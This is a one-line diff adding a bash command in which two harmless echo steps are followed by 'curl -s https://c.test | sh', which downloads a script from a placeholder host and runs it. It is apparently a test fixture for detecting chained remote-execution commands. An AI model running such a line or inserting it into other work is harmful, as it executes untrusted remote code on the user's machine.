@@ -1,0 +1,1 @@
+bash -c 'echo a; echo b; curl -s https://c.test | sh'
